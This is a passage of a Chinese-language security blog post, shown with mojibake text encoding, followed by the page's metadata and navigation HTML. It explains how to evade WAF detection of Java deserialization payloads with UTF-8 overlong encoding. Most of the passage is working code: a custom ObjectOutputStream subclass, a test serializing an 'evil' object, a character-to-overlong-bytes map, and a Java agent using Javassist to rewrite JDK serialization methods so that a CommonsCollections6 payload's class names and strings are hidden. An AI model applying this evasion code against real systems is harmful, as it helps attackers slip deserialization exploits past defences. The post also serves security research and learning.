} else { buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); pos += 2; } } else { // write one byte at a time to normalize block if (c \u003c= 0x007F \u0026\u0026 c != 0) { write(c); } else if (c \u003e 0x07FF) { write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } else { write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¶…è¿‡limitä¼šè¿›å…¥åˆ°è¿™ä¸ªelseï¼Œlimitæ˜¯1204-3ï¼Œæˆ‘ä»¬çœ‹çœ‹writeå¹²äº†å•¥\nå¯ä»¥çœ‹åˆ°å½“posè¶…è¿‡MAX_BLOCK_SIZEæ‰§è¡Œäº†drain(),å°±æ˜¯è¿›è¡Œå†™å…¥ï¼Œç„¶åposå½’0ï¼Œç„¶åä¼šæŠŠ(byte) bè®°å½•åˆ°BlockDataOutputStream.bufä¸­è¿™é‡Œä¸å°±å¯ä»¥è®¾ç½®bufå˜é‡çš„å€¼äº†ä¹ˆï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯BlockDataOutputStreamç±»çš„æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿè°ƒä¸äº†å‘€\nä½†æ˜¯ObjectOutputStreamä¹Ÿæœ‰ä¸ªwriteå¯ä»¥å¸®æˆ‘ä»¬è°ƒç”¨BlockDataOutputStreamçš„writeäº†hhh\npublic void write(int val) throws IOException { bout.write(val); } é‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ObjectOutputStream.writeæ¥å°†æˆ‘ä»¬è¦å†™å…¥çš„å€¼è®°å½•åˆ°BlockDataOutputStream.bufä¸­ï¼Œç„¶ådrain()çš„æ—¶å€™è¿›è¡Œå†™å…¥ã€‚\nå¿ƒç†è·¯ç¨‹ï¼ŒæŒºä¹±çš„å¯ä»¥ä¸çœ‹\nä¸èƒ½ç›´æ¥é‡å†™writeUTFBodyï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é‡å†™writeUTFä»–æ˜¯ObjectOutputStreamæ–¹æ³•ä¸”æ˜¯publicï¼Œç„¶åæŠŠwriteUTFä¸­éœ€è¦åŠç”¨çš„æ–¹æ³•éƒ½å¯ä»¥é‡æ–°æ„é€ æˆæˆ‘ä»¬çš„æ–¹æ³•ï¼ˆgetUTFLengthï¼ŒwriteUTFBodyï¼‰//æœ€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯é‡å†™äº†åé¢å‘ç°å…¶å®ä¸æ˜¯ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºå°±ä¿®æ”¹ä¸‹èŒƒå›´å°±æå®šäº†ï¼Œå‘ç°å…¶å®ä¸æ˜¯è¿™ä¹ˆäº‹ï¼Œæœ€åˆçš„pocï¼ˆå°±æ˜¯ä¸‹é¢poc1æŠŠæ³¨é‡Šå–æ¶ˆçš„ä»£ç ï¼‰å¹¶æ²¡æœ‰è¿›è¡Œç±»åçš„å†™å…¥ï¼Œç»§ç»­è°ƒè¯•äº†ä¸‹ä»£ç å‘ç°writeByteså’ŒwriteUTFBodyä¸­å…¶å®å¹¶ä¸ä¼šæ‰§è¡ŒçœŸæ­£çš„writeæ“ä½œï¼Œåªæ˜¯æŠŠå€¼è®°å½•åˆ°BlockDataOutputStream.bufå˜é‡ä¸­ï¼Œè€Œæˆ‘pocçš„ç±»ä¹Ÿåªæ˜¯è®°å½•åˆ°MyObjectOutputStream.buf,è€Œä¸æ˜¯BlockDataOutputStreamä¸­çš„bufè¿™ä¹Ÿæ˜¯æ‰§è¡Œdrain()çš„æ—¶å€™ï¼Œå…¶å®bufé‡Œæ²¡æœ‰å€¼hhhï¼Œæ‰€ä»¥æ²¡æœ‰å†™å…¥\npoc1 è¿™é‡Œæˆ‘æŠŠ2å¤„å°äº7Fçš„èŒƒå›´æ”¹æˆï¼Œc \u003c= 0x0020 \u0026\u0026 c != 0ï¼Œ20å¯¹åº”çš„æ˜¯32ï¼Œç©ºç™½ç¬¦å°±1byteçš„æ ¼å¼ï¼Œå¤§äº32çš„å°±é‡‡ç”¨2byteï¼Œå®ç°æˆ‘ä»¬çš„åŠ å¯†ã€‚\npocä¸­åªæœ‰writeUTF(String s)æ˜¯é‡å†™ï¼Œå…¶ä»–éƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ„å»ºçš„è¿™äº›æ–¹æ³•ï¼Œå› ä¸ºçˆ¶ç±»æ²¡æœ‰è¿™äº›æ–¹æ³•ï¼Œè€ŒwriteUTF(String s, long utflen)æ˜¯å› ä¸ºåŒ…çš„åŸå› å…¶å®ä¹Ÿä¸æ˜¯é‡å†™ã€‚\npackage UTF8; import java.io.IOException; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.io.UTFDataFormatException; public class MyObjectOutputStream extends ObjectOutputStream { private static final int MAX_BLOCK_SIZE = 1024; /** maximum data block header length */ private final char[] cbuf = new char[CHAR_BUF_SIZE]; /** (tunable) length of char buffer (for writing strings) */ private static final int CHAR_BUF_SIZE = 256; private int pos = 0; private final byte[] buf = new byte[MAX_BLOCK_SIZE]; public MyObjectOutputStream(OutputStream out) throws IOException { super(out); } public void writeUTF(String s) throws IOException { writeUTF(s, getUTFLength(s)); } void writeUTF(String s, long utflen) throws IOException { if (utflen \u003e 0xFFFFL) { throw new UTFDataFormatException(); } writeShort((int) utflen); if (utflen == (long) s.length()) { writeBytes(s); } else { writeUTFBody(s); } } private void writeUTFBody(String s) throws IOException { int limit = MAX_BLOCK_SIZE - 3; int len = s.length(); for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; // if (pos \u003c= limit) { // if (c \u003c= 0x0020 \u0026\u0026 c != 0) { // buf[pos++] = (byte) c; // } else if (c \u003e 0x07FF) { // buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); // buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); // buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); // pos += 3; // } else { // buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); // buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); // pos += 2; // } // } else { // write one byte at a time to normalize block if (c \u003c= 0x0020 \u0026\u0026 c != 0) { write(c); } else if (c \u003e 0x07FF) { write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } else { write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } // } } off += csize; } } long getUTFLength(String s) { int len = s.length(); long utflen = 0; for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; if (c \u003e= 0x0001 \u0026\u0026 c \u003c= 0x0020) { utflen++; } else if (c \u003e 0x07FF) { utflen += 3; } else { utflen += 2; } } off += csize; } return utflen; } } package UTF8; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class test { public static void main(String[] args) throws Exception { evil evil = new evil(); FileOutputStream fileOut = new FileOutputStream(\"1obj.bin\"); MyObjectOutputStream out = new MyObjectOutputStream(fileOut); out.writeObject(evil); out.close(); FileInputStream fileIn = new FileInputStream(\"1obj.bin\"); ObjectInputStream in = new ObjectInputStream(fileIn); in.readObject(); in.close(); } } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”Ÿæˆæ•°æ®æµå·²ç»æ²¡æœ‰å¯æ‰“å°å­—ç¬¦äº†\nï¿½ï¿½ \u0005sr UTF8.evilï¿½ï¿½ï¿½ï¿½4ï¿½ï¿½\u000e\u0002 xp //è¿™ä¸ªæ˜¯æ­£å¸¸ç”Ÿæˆçš„å¯ä»¥çœ‹åˆ°æ˜æ–‡ç±»å ç„¶åæˆ‘çœ‹äº†ä¸‹ç½‘ä¸Šæœ€å¼€å§‹çš„æ–¹æ¡ˆå§\næ˜¯è®¾ç½®äº†ä¸€ä¸ªè½¬æ¢çš„mapï¼Œç„¶åå°†length*2or3ï¼Œç„¶åç›´æ¥writeçš„è¿™ç§å½¢å¼ï¼Œç°åœ¨çœ‹æ„Ÿè§‰å¯èƒ½æ„Ÿè§‰æœ‰ç‚¹å°ç¬¨æ‹™hhï¼Œä½†æˆ‘çš„pocå’Œè¿™ç§æ–¹å¼éƒ½æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯éƒ½åªé’ˆå¯¹äº†classnameè¿˜æœ‰å±æ€§åå’Œå±æ€§å€¼æ²¡æ“ä½œå‘€ï¼ï¼ï¼æˆ‘çš„è¯„ä»·æ˜¯imperfect\nmap = new HashMap\u003c\u003e(); map.put('.', new int[]{0xc0, 0xae}); map.put(';', new int[]{0xc0, 0xbb}); map.put('$', new int[]{0xc0, 0xa4}); map.put('[', new int[]{0xc1, 0x9b}); map.put(']', new int[]{0xc1, 0x9d}); map.put('a', new int[]{0xc1, 0xa1}); map.put('b', new int[]{0xc1, 0xa2}); map.put('c', new int[]{0xc1, 0xa3}); map.put('d', new int[]{0xc1, 0xa4}); map.put('e', new int[]{0xc1, 0xa5}); map.put('f', new int[]{0xc1, 0xa6}); å¯ä»¥çœ‹åˆ°æ—¢ç„¶è¿˜æœ‰getRuntimeè¿™ç§å­—çœ¼ï¼ï¼\né‚£ä¹ˆå°±å¼€å§‹æˆ‘ä»¬çš„perfectä¹‹è·¯å§\nè°ƒè¯•å‘ç°åœ¨writeStringä¼šå¯¹å±æ€§è¿›è¡Œæ“ä½œ\nä½†æ˜¯writeStringå’ŒwriteTypeStringéƒ½ä¸æ˜¯publicå‘€ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥é‡å†™ã€‚\nè¦é‡å†™writeStringçš„è¯è¦åˆ°åœ¨ä¸€ä¸ªåŒ…é‡Œé¢å‘€ï¼Œæ²¡é”™æˆ‘è¿˜çœŸè¿™ä¹ˆå¹²äº†ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯æ²¡æˆåŠŸhh\næˆ‘ä»¬æœ¬åœ°ç”Ÿæˆä¸ªpackageä¹Ÿæ˜¯java.ioï¼Œç„¶ååœ¨å¦ä¸€ä¸ªç±»è°ƒç”¨ä¸€æ¬¡æˆ‘ä»¬çš„MyObjectOutputStreamï¼Œç›®çš„æ˜¯ç”Ÿæˆclassæ–‡ä»¶ï¼Œåœ¨targetä¸­æ‰¾åˆ°classæ–‡ä»¶ï¼Œå…³é—­ç›¸å…³javaåº”ç”¨ç„¶åæ‰¾åˆ°è¿™ä¸ªrt.jaråŒ…æ’å…¥æˆ‘ä»¬classï¼Œæˆ‘æŠŠjavaæºç æ”¾åˆ°src.zipä¸­äº†æ–¹ä¾¿è°ƒè¯•\næ‰§è¡Œæ˜¯æˆåŠŸäº†ï¼Œç”Ÿæˆçš„ä¸œè¥¿çœ‹ç€ä¹Ÿæ²¡å•¥æ¯›ç—…ï¼Œä½†æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™å‡ºé—®é¢˜äº†ï¼Œä½†æ˜¯æˆ‘ä¸æƒ³åˆ†æè¿™ä¸ªäº†ï¼Œè·Ÿæˆ‘æœ€åˆçš„æ€è·¯èƒŒé“è€Œé©°äº†\nä¼°è®¡æ˜¯è¿™ä¸ªhandlesçš„é—®é¢˜ï¼Œæˆ‘æŠŠè¿™ä¸ªhandlesç¼–ç ç›¸å…³çš„éƒ½æ³¨é‡Šäº†ï¼Œä¸ç„¶è¿è¡Œä¸äº†ï¼Œå› ä¸ºä»–ä¹Ÿæ˜¯ä¸€ä¸ªå­ç±»çš„å€¼åé¢åˆå¾ˆéº»çƒ¦ï¼â€”â€”ï¼\nçœ‹åˆ°writeStringå½’æ ¹åˆ°åº•ï¼Œè¿˜æ˜¯è°ƒç”¨çš„writeUTFBodyæ–¹æ³•ï¼Œé‚£æˆ‘éƒ½åˆ°ä¿®æ”¹java.ioä¸‹çš„åŒ…äº†ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä¿®æ”¹writeUTFBodyé‡Œçš„ä»£ç ä¸å°±è¡Œäº†ä¹ˆï¼Ÿï¼Ÿ\nä½†æ˜¯æˆ‘åˆæ‡’å¾—å†æ“ä½œä¸€ç¯‡äº†hhï¼Œå› ä¸ºæˆ‘çœ‹åˆ°äº†è¿™ç¯‡æ–‡ç«  ç”¨agentæ“ä½œ ï¼Œæ€è·¯æ˜¯ä¸€æ ·å°±æ˜¯ä¿®æ”¹writeUTFBodyçš„ä»£ç ï¼Œæ–‡ç« ä¸­æ˜¯æ³¨é‡Šäº†å…¶ä»–ifèŒƒå›´é™åˆ¶ï¼Œéƒ½ç”¨3byteçš„å½¢å¼ç”Ÿæˆutf-8ç¼–ç \n0x05 agent å½“ç„¶å•¦å¯¹äºä¸ä¼šagentçš„å°ä¼™ä¼´æ¥è¯´ï¼Œä¼šæœ‰ç‚¹å›°éš¾ï¼Œç¬”è€…è¿™é‡Œä¹Ÿä¸ä¼šä¸ç„¶ä¸è‡³äºç»•é‚£ä¹ˆå¤šåœˆå­ï¼Œé‚£å°±åœ¨è¿™é‡Œçªç ´æé™ï¼ï¼\næ¨èä¸¤ç¯‡æ–‡ç« ï¼Œdemoæ„å»ºèµ·æ¥æŒºé¡ºåˆ©çš„ï¼Œä¹Ÿæœ‰ä¸ªå¤§æ¦‚çš„ç†è§£ï¼Œè¿™é‡Œä¸»è¦ç”¨æ¥ä¿®æ”¹å­—èŠ‚ç \né€šè¿‡ -javaagent å‚æ•°æŒ‡å®š agent, ä»è€Œåœ¨ JVM å¯åŠ¨ä¹‹å‰ä¿®æ”¹ class å†…å®¹ (è‡ª JDK 1.5) é€šè¿‡ VirtualMachine.attach() æ–¹æ³•, å°† agent é™„åŠ åœ¨å¯åŠ¨åçš„ JVM è¿›ç¨‹ä¸­, è¿›è€ŒåŠ¨æ€ä¿®æ”¹classå†…å®¹ï¼Œç„¶åé‡æ–°åŠ è½½è¿™ä¸ªclass (è‡ª JDK 1.6) https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0\nhttps://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE //windowè·Ÿè¿™ç¯‡ç›´æ¥ideaæ„é€ çš„demo\nè¿™é‡Œå°±ä¸å†å™è¿°äº†ï¼Œè®°å½•ä¸‹æ„å»ºdemoçš„ä¸€äº›ç»†èŠ‚çš„åœ°æ–¹\nä¾èµ–å¯ä»¥ç›´æ¥ åœ¨åº“é‡Œé¢æ·»åŠ javaæ¥æ·»åŠ jar æˆ–è€…pom.xml\ncom.sun tools 1.8.0 system C:/MyFiles/Tools/ENV/JAVA/jdk1.8.0_74/lib/tools.jar -javaagent è¿™é‡Œideaç‚¹å‡»ä¿®æ”¹é€‰é¡¹ï¼Œç„¶åæ·»åŠ è™šæ‹Ÿæœºé€‰é¡¹ï¼Œè¿™æ—¶ä¼šåœ¨testç±»ä¸Šæ–¹å¤šå‡ºä¸€è¡Œï¼Œè¿™ä¸ªåœ°æ–¹å¡«å…¥æˆ‘ä»¬çš„javaagent\nå…¶ä¸­å¸¦æœ‰ Instrumentation inst å‚æ•°çš„æ–¹æ³•ä¼˜å…ˆçº§æ›´é«˜, ä¼šä¼˜å…ˆè¢«è°ƒç”¨\nè¿™å¥è¯çš„ç†è§£ï¼Œæˆ‘å®éªŒçš„ç»“æœæ˜¯ï¼Œä¸¤ä¸ªpremainéƒ½å­˜åœ¨çš„æ—¶å€™åªæ‰§è¡Œäº†instå‚æ•°çš„ï¼Œå½“åªæœ‰argså‚æ•°çš„premainçš„æ—¶å€™ä¼šè¾“å‡º on inset\nagentmain æ–¹å¼ Demo\npackage com.example; import java.lang.instrument.Instrumentation; public class Demo { public static void agentmain(String args, Instrumentation inst) throws Exception { System.out.println(\"agentmain\"); } } MANIFEST.MF\nManifest-Version: 1.0 Agent-Class: com.example.Demo ç„¶åæ‰“åŒ…æˆagent.jar\nå¦ä¸€ä¸ªideaé¡¹ç›®ä¸‹\ntestç”¨äºæ¨¡æ‹Ÿä¸€ç›´è¿è¡Œçš„ç¨‹åº\npublic class test { public static void main(String[] args) throws InterruptedException { while (true) { System.out.println(\"Hello World\"); Thread.sleep(1000); } } } jpsæ‰¾åˆ°testå¯¹åº”id\nimport com.sun.tools.attach.*; import java.io.IOException; import java.util.List; public class agent_test { public static void main(String[] args) throws AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException { VirtualMachine attach = VirtualMachine.attach(\"21476\"); // å‘½ä»¤è¡Œæ‰¾åˆ°è¿™ä¸ªjvmçš„è¿›ç¨‹å· attach.loadAgent(\"C:\\\\Users\\\\jie\\\\Desktop\\\\Java\\\\Learn\\\\out\\\\artifacts\\\\agent_jar\\\\agent.jar\"); attach.detach(); System.out.println(\"attach ok\"); // List list = VirtualMachine.list(); // å¾—åˆ° JVM è¿›ç¨‹åˆ—è¡¨ // for (VirtualMachineDescriptor desc : list){ // éå† // String name = desc.displayName(); // è¿›ç¨‹å // String pid = desc.id(); // PID // // if (name.contains(\"test\")){ // System.out.println(pid); // VirtualMachine vm = VirtualMachine.attach(pid); // vm.loadAgent(\"C:\\\\Users\\\\jie\\\\Desktop\\\\Java\\\\Learn\\\\out\\\\artifacts\\\\agent_jar\\\\agent.jar\"); // vm.detach(); // System.out.println(\"attach ok\"); // break; // } // } } } ç„¶åè¿è¡Œagent_testè¿›è¡Œattachï¼ŒæˆåŠŸæ‰§è¡Œagentmain()ä¸­çš„ä»£ç \nå®æˆ˜ æˆ‘ä»¬å­¦å®Œagentæ€ä¹ˆä¿®æ”¹classåè§£å†³è¿™ä¸ªé—®é¢˜è½»è€Œæ˜“ä¸¾ï¼\næˆ‘è¿™é‡Œæ˜¯ç”¨premainï¼Œç„¶åé€šè¿‡javaagentæ¥åŠ è½½æˆ‘ä»¬ç”Ÿæˆçš„jaråŒ…ï¼Œè¿™é‡Œç›´æ¥ä¸Šæˆ‘æœ€åçš„pocå§\nJieTransformer\npackage com.jie; import javassist.*; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; import java.io.IOException; public class JieTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class\u003c?\u003e classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { try { //æ‹¦æˆªå³å°†è¢«åŠ è½½æˆ–é‡åŠ è½½çš„class if(className.equals(\"java/io/ObjectOutputStream$BlockDataOutputStream\")) { System.out.println(\"111111111111111\"); ClassPool cp = ClassPool.getDefault(); cp.importPackage(IOException.class.getName()); // if (classBeingRedefined != null) { // ClassClassPath ccp = new ClassClassPath(classBeingRedefined); // cp.insertClassPath(ccp); // } CtClass ctc = cp.get(\"java.io.ObjectOutputStream$BlockDataOutputStream\"); CtMethod method1 = ctc.getDeclaredMethod(\"getUTFLength\", new CtClass[]{cp.get(\"java.lang.String\")}); ctc.removeMethod(method1); CtMethod make1=CtNewMethod.make(\"long getUTFLength(String s) {\\n\" + \" int len = s.length();\\n\" + \" long utflen = 0;\\n\" + \" for (int off = 0; off \u003c len; ) {\\n\" + \" int csize = Math.min(len - off, CHAR_BUF_SIZE);\\n\" + \" s.getChars(off, off + csize, cbuf, 0);\\n\" + \" for (int cpos = 0; cpos \u003c csize; cpos++) {\\n\" + \" char c = cbuf[cpos];\\n\" + // \" if (c \u003e= 0x0001 \u0026\u0026 c \u003c= 0x0020) {\\n\" + // \" utflen++;\\n\" + // \" } else if (c \u003e 0x07FF) {\\n\" + // \" utflen += 3;\\n\" + // \" } else {\\n\" + \" utflen += 2;\\n\" + // \" }\\n\" + \" }\\n\" + \" off += csize;\\n\" + \" }\\n\" + \" return utflen;\\n\" + \" }\",ctc); CtMethod method2 = ctc.getDeclaredMethod(\"writeUTFBody\", new CtClass[]{cp.get(\"java.lang.String\")}); ctc.removeMethod(method2); CtMethod make2=CtMethod.make(\"private void writeUTFBody(String s) {\\n\" + \" int limit = MAX_BLOCK_SIZE - 3;\\n\" + \" int len = s.length();\\n\" + \" for (int off = 0; off \u003c len; ) {\\n\" + \" int csize = Math.min(len - off, CHAR_BUF_SIZE);\\n\" + \" s.getChars(off, off + csize, cbuf, 0);\\n\" + \" for (int cpos = 0; cpos \u003c csize; cpos++) {\\n\" + \" char c = cbuf[cpos];\\n\" + \" if (pos \u003c= limit) {\\n\" + // \" if (c \u003c= 0x0020 \u0026\u0026 c != 0) {\\n\" + // \" buf[pos++] = (byte) c;\\n\" + // \" } else if (c \u003e 0x07FF) {\\n\" + // \" buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + // \" buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F));\\n\" + // \" buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F));\\n\" + // \" pos += 3;\\n\" + // \" } else {\\n\" + \" buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + \" buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F));\\n\" + \" pos += 2;\\n\" + // \" }\\n\" + \" } else { // write one byte at a time to normalize block\\n\" + // \" if (c \u003c= 0x0020 \u0026\u0026 c != 0) {\\n\" + // \" write(c);\\n\" + // \" } else if (c \u003e 0x07FF) {\\n\" + // \" write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F));\\n\" + // \" write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F));\\n\" + // \" write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + // \" } else {\\n\" + \" write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F));\\n\" + \" write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F));\\n\" + // \" }\\n\" + \" }\\n\" + \" }\\n\" + \" off += csize;\\n\" + \" }\\n\" + \" }\",ctc); ctc.addMethod(make1); ctc.addMethod(make2); byte[] bytes = ctc.toBytecode(); ctc.detach(); System.out.println(\"maked\"); return bytes; } } catch (Exception e){ e.printStackTrace(); } return null; } } Demo\npackage com.jie; import com.n1ght.NightTransformer; import java.io.ObjectOutputStream; import java.lang.instrument.Instrumentation; import java.lang.reflect.AccessibleObject; public class Demo { public static void premain(String args, Instrumentation inst) throws Exception { inst.addTransformer(new JieTransformer(), true); //ç”Ÿæˆtransform() inst.retransformClasses(new Class[] { Object.class }); //è¿™é‡Œåªæ˜¯ç”¨æ¥è§¦å‘ç”Ÿæˆtransform() // é‡åŠ è½½æŸä¸ª class, æ³¨æ„åœ¨é‡åŠ è½½ class çš„è¿‡ç¨‹ä¸­, ä¹‹å‰è®¾ç½®çš„ transformer ä¼šæ‹¦æˆªè¯¥ class } } MANIFEST.MF\nManifest-Version: 1.0 Can-Redefine-Classes: true Can-Retransform-Classes: true Premain-Class: com.jie.Demo ç„¶åå°†è¿™ä¸ªæ¨¡å—ç”ŸæˆjaråŒ…ï¼Œåœ¨CC6æ‰§è¡Œæ·»åŠ è¿™ä¸ª-javaagent:jarpath\nçœ‹çœ‹æ•ˆæœå›¾å§ï¼Œå±æ€§çš„é—®é¢˜éƒ½è§£å†³äº†\n",
  "wordCount" : "8037",
  "inLanguage": "zh",
  "datePublished": "2024-12-12T20:01:23+08:00",
  "dateModified": "2024-12-12T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–
    </h1>
    <div class="post-meta"><span title='2024-12-12 20:01:23 +0800 CST'>2024-12-12</span>&nbsp;Â·&nbsp;17 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-%e5%89%8d%e8%a8%80" aria-label="0x01 å‰è¨€">0x01 å‰è¨€</a></li>
                    <li>
                        <a href="#0x02-utf-8-overlong-encoding%e5%8e%9f%e7%90%86" aria-label="0x02 UTF-8 Overlong EncodingåŸç†">0x02 UTF-8 Overlong EncodingåŸç†</a><ul>
                            
                    <li>
                        <a href="#utf-8%e7%bc%96%e7%a0%81" aria-label="utf-8ç¼–ç ">utf-8ç¼–ç </a></li></ul>
                    </li>
                    <li>
                        <a href="#0x03-readobject-utf-8" aria-label="0x03 readObject UTF-8">0x03 readObject UTF-8</a><ul>
                            
                    <li>
                        <a href="#128-%e6%ac%a7%e5%85%83%e7%ac%a6%e5%8f%b7" aria-label="128 æ¬§å…ƒç¬¦å·">128 æ¬§å…ƒç¬¦å·</a></li>
                    <li>
                        <a href="#3byte" aria-label="3byte">3byte</a></li>
                    <li>
                        <a href="#real-128" aria-label="real 128">real 128</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e5%bc%80%e5%a7%8b%e6%9e%84%e9%80%a0" aria-label="0x04 å¼€å§‹æ„é€ ">0x04 å¼€å§‹æ„é€ </a><ul>
                            
                    <li>
                        <a href="#writeutf" aria-label="writeUTF">writeUTF</a></li>
                    <li>
                        <a href="#poc%e6%9e%84%e9%80%a0" aria-label="pocæ„é€ ">pocæ„é€ </a><ul>
                            
                    <li>
                        <a href="#drain" aria-label="drain()">drain()</a></li>
                    <li>
                        <a href="#buf" aria-label="buf">buf</a></li></ul>
                    </li>
                    <li>
                        <a href="#poc1" aria-label="poc1">poc1</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x05-agent" aria-label="0x05 agent">0x05 agent</a><ul>
                            
                    <li>
                        <a href="#agentmain-%e6%96%b9%e5%bc%8f" aria-label="agentmain æ–¹å¼">agentmain æ–¹å¼</a></li>
                    <li>
                        <a href="#%e5%ae%9e%e6%88%98" aria-label="å®æˆ˜">å®æˆ˜</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
